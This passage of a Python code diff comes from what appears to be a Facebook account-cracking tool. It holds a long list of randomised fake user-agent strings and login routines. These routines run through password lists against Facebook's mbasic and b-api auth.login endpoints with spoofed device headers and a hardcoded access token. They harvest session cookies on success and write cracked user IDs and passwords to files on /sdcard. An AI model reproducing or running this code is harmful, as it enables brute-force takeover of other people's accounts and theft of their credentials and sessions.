NT 10.0; 10; Win64; x64)U354U) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4922.70 Chrome/101.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V873V) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4560.90 Chrome/166.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I910I) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4864.91 Chrome/170.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P546P) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4817.36 Chrome/99.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W333W) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4890.59 Chrome/165.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A244A) AppleWebKit/537.36 (KHTML, like Gecko)146.0.4845.37 Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y723Y) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4962.96 Chrome/161.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I560I) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4650.69 Chrome/166.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B110B) AppleWebKit/537.36 (KHTML, like Gecko)123.0.4934.60 Chrome/169.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P509P) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4943.92 Chrome/145.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W435W) AppleWebKit/537.36 (KHTML, like Gecko)123.0.4840.58 Chrome/157.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F747F) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4934.52 Chrome/109.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A492A) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4717.41 Chrome/133.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G455G) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4555.56 Chrome/125.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O869O) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4810.63 Chrome/127.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M699M) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4891.64 Chrome/124.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K878K) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4697.72 Chrome/138.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X725X) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4707.38 Chrome/173.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S136S) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4878.89 Chrome/140.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D813D) AppleWebKit/537.36 (KHTML, like Gecko)146.0.4961.37 Chrome/124.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R490R) AppleWebKit/537.36 (KHTML, like Gecko)137.0.4854.90 Chrome/168.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C971C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4677.52 Chrome/153.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J336J) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4962.73 Chrome/139.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T667T) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4536.74 Chrome/172.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A669A) AppleWebKit/537.36 (KHTML, like Gecko)117.0.4924.51 Chrome/106.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W362W) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4713.97 Chrome/165.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z364Z) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4555.46 Chrome/149.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P635P) AppleWebKit/537.36 (KHTML, like Gecko)107.0.4514.88 Chrome/151.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U931U) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4778.50 Chrome/149.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B832B) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4690.87 Chrome/108.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M586M) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4537.97 Chrome/103.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J755J) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4986.84 Chrome/157.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T629T) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4536.89 Chrome/168.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q510Q) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4589.79 Chrome/117.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O109O) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4846.85 Chrome/149.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G438G) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4949.45 Chrome/109.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q665Q) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4617.67 Chrome/111.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S762S) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4645.46 Chrome/148.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D288D) AppleWebKit/537.36 (KHTML, like Gecko)144.0.4616.52 Chrome/157.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H549H) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4924.85 Chrome/148.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G680G) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4526.82 Chrome/163.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K260K) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4552.79 Chrome/108.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W927W) AppleWebKit/537.36 (KHTML, like Gecko)111.0.4807.45 Chrome/142.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G795G) AppleWebKit/537.36 (KHTML, like Gecko)133.0.4503.43 Chrome/99.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P818P) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4689.77 Chrome/145.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F823F) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4857.71 Chrome/135.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J639J) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4661.65 Chrome/158.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D456D) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4780.88 Chrome/151.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W111W) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4633.89 Chrome/101.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L726L) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4905.66 Chrome/106.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W130W) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4628.78 Chrome/104.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A141A) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4571.51 Chrome/155.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M394M) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4797.99 Chrome/121.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L532L) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4817.64 Chrome/146.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D97D) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4869.78 Chrome/159.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L876L) AppleWebKit/537.36 (KHTML, like Gecko)110.0.4816.94 Chrome/139.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F683F) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4767.59 Chrome/149.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W656W) AppleWebKit/537.36 (KHTML, like Gecko)144.0.4932.89 Chrome/144.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B930B) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4704.47 Chrome/142.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C388C) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4600.81 Chrome/111.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K933K) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4885.54 Chrome/175.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T652T) AppleWebKit/537.36 (KHTML, like Gecko)112.0.4671.98 Chrome/135.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P702P) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4667.39 Chrome/105.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P231P) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4908.94 Chrome/171.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W554W) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4990.55 Chrome/173.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H93H) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4541.79 Chrome/163.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q739Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4860.81 Chrome/149.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C540C) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4619.71 Chrome/129.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E916E) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4607.48 Chrome/145.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E988E) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4507.79 Chrome/154.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I676I) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4597.76 Chrome/170.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H504H) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4899.59 Chrome/171.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A174A) AppleWebKit/537.36 (KHTML, like Gecko)131.0.4576.53 Chrome/136.0.1.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D368D) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4595.82 Chrome/142.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E654E) AppleWebKit/537.36 (KHTML, like Gecko)128.0.4617.71 Chrome/117.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y274Y) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4851.96 Chrome/137.0.2.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C304C) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4850.80 Chrome/122.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D97D) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4941.41 Chrome/164.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K401K) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4526.62 Chrome/119.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V341V) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4724.37 Chrome/140.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P486P) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4983.42 Chrome/116.0.0.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W221W) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4513.91 Chrome/162.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S191S) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4782.74 Chrome/142.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H560H) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4968.42 Chrome/156.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O740O) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4745.38 Chrome/135.0.0.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X493X) AppleWebKit/537.36 (KHTML, like Gecko)120.0.4911.75 Chrome/107.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P298P) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4710.97 Chrome/107.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W871W) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4597.60 Chrome/145.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X689X) AppleWebKit/537.36 (KHTML, like Gecko)124.0.4679.53 Chrome/132.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H608H) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4703.44 Chrome/107.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R104R) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4981.90 Chrome/149.0.1.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D907D) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4692.68 Chrome/159.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M64M) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4969.71 Chrome/168.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W138W) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4655.48 Chrome/172.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I335I) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4792.36 Chrome/158.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D643D) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4960.76 Chrome/127.0.4.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O857O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4883.72 Chrome/127.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I724I) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4608.62 Chrome/168.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U460U) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4873.63 Chrome/124.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P671P) AppleWebKit/537.36 (KHTML, like Gecko)115.0.4750.65 Chrome/120.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y346Y) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4725.48 Chrome/125.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N955N) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4658.52 Chrome/125.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J239J) AppleWebKit/537.36 (KHTML, like Gecko)149.0.4561.57 Chrome/159.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K111K) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4751.76 Chrome/164.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N922N) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4836.66 Chrome/108.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N625N) AppleWebKit/537.36 (KHTML, like Gecko)109.0.4975.83 Chrome/121.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I304I) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4520.76 Chrome/114.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U939U) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4899.56 Chrome/130.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E786E) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4590.86 Chrome/163.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T98T) AppleWebKit/537.36 (KHTML, like Gecko)121.0.4576.60 Chrome/155.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O955O) AppleWebKit/537.36 (KHTML, like Gecko)127.0.4746.45 Chrome/151.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N74N) AppleWebKit/537.36 (KHTML, like Gecko)128.0.4729.84 Chrome/153.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F187F) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4836.85 Chrome/174.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L494L) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4881.86 Chrome/104.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S399S) AppleWebKit/537.36 (KHTML, like Gecko)106.0.4899.48 Chrome/138.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W140W) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4774.69 Chrome/167.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O122O) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4659.42 Chrome/151.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q719Q) AppleWebKit/537.36 (KHTML, like Gecko)109.0.4824.43 Chrome/140.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G814G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4861.74 Chrome/154.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A719A) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4672.37 Chrome/115.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R137R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4751.54 Chrome/99.0.1.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L410L) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4919.75 Chrome/137.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T889T) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4769.80 Chrome/112.0.0.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U555U) AppleWebKit/537.36 (KHTML, like Gecko)110.0.4668.93 Chrome/103.0.3.3 Safari/537.36']
+                        session = requests.Session()
+                        uaxp = random.choice(agents)
+                        Tanimvai = session.get('https://mbasic.facebook.com').text
+                        apple = {
+                            "lsd":re.search('name="lsd" value="(.*?)"', str(Tanimvai)).group(1),
+                        "jazoest":re.search('name="jazoest" value="(.*?)"', str(Tanimvai)).group(1),
+                        "m_ts":re.search('name="m_ts" value="(.*?)"', str(Tanimvai)).group(1),
+                        "li":re.search('name="li" value="(.*?)"', str(Tanimvai)).group(1),
+                        "try_number":"0",
+                        "unrecognized_tries":"0",
+                        "email":ids,
+                        "pass":ps,
+                        "login":"Log In"}
+                        tedy = {
+                        'authority': 'x.facebook.com',
+                        'method': 'GET',
+                        'scheme': 'https',
+                        'path': '/login/device-based/regular/login/?refsrc',
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                        'cache-control': 'max-age=0',
+                        'sec-ch-prefers-color-scheme': 'light',
+                        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                        'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+                        'sec-ch-ua-mobile': '?1',
+                        'sec-ch-ua-platform': '"Android"',
+                        'sec-ch-ua-platform-version': '"10.0.0"',
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'none',
+                        'sec-fetch-user': '?1',
+                        'upgrade-insecure-requests': '1',
+                        'user-agent': uaxp}
+                        lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=apple,headers=tedy).text
+                        Tanim=session.cookies.get_dict().keys()
+                        if 'c_user' in Tanim:
+                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                uid = re.findall('c_user=(.*);xs', coki)[0]
+                                lock_ramove(coki,uid,ps)
+                                break
+                        elif 'checkpoint' in Tanim:
+                                print('\r\r\x1b[38;5;208m[\x1b[38;5;208mBHOOT-CP\x1b[38;5;208m] \x1b[38;5;208m'+str(uid)+' | '+ps+'\033[1;37m')
+                                open('/sdcard/BLACK-RNDM-CP.txt','a').write(str(uid)+'|'+ps+'\n')
+                                cp.append(uid)
+                                break
                         else:continue
                 loop+=1
-        except Exception as e:
-                pass
-
-def trt2(ids,passlist):
-	global loop
-	global oks
-	try:
-		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-			application_version_code=str(random.randint(000000000,999999999))
-			__iam_genius = random.choice(android_models)
-			phone_model = __iam_genius.split('|')[0]
-			phone_company = __iam_genius.split('|')[1]
-			dimensions = __iam_genius.split('|')[2]
-			ffb=random.choice(fbks)
-			dvlk = random.choice(usr)
-			#1 method issue es ma ha
-			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
-			device_family_id = str(uuid.uuid4())
-			adid = str(uuid.uuid4())
-			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-			data = {'adid':adid,
-				'format':'json',
-				'device_id':device_family_id,
-				'email':ids,
-				'password':pas,
-				'generate_analytics_claim':'1',
-				'community_id':'','cpl':'true','try_num':'1',
-				'family_device_id':device_family_id,
-				'credentials_type':'device_based_login_password',
-				'generate_session_cookies':'1',
-				'error_detail_type':'button_with_disabled',
-				'source':'device_based_login',
-				'machine_id':machine_id,
-				'login_location_accuracy_m':'1.0',
-				'meta_inf_fbmeta':'',
-				'advertiser_id':adid,
-				'encrypted_msisdn':'',
-				'currently_logged_in_userid':'0',
-				'locale':'en_PK',
-				'client_country_code':'PK',
-				'method':'auth.login',
-				'fb_api_req_friendly_name':'authenticate',
-				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			head = {
-				'content-type':'application/x-www-form-urlencoded',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-type':'unknown',
-				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'api_key': '8114af471d039628db5c68cb127af936',
-				'user-agent':ua_string,
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-				'x-fb-connection-quality':'EXCELLENT',
-				'x-fb-friendly-name':'authenticate',
-				'accept-encoding':'gzip, deflate',
-				'x-fb-http-engine':	'Liger'}
-			url = 'https://b-api.facebook.com/method/auth.login'
-			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-			q = json.loads(po)
-			if 'session_key' in q:
-				udx = str(q['uid'])
-				print('\r\r\033[1;32m [TRT-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/TRT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
-				cps.append(ids)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(10)
-	except Exception as e:
-		print(e)
-#new method
-                
-def trt3(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
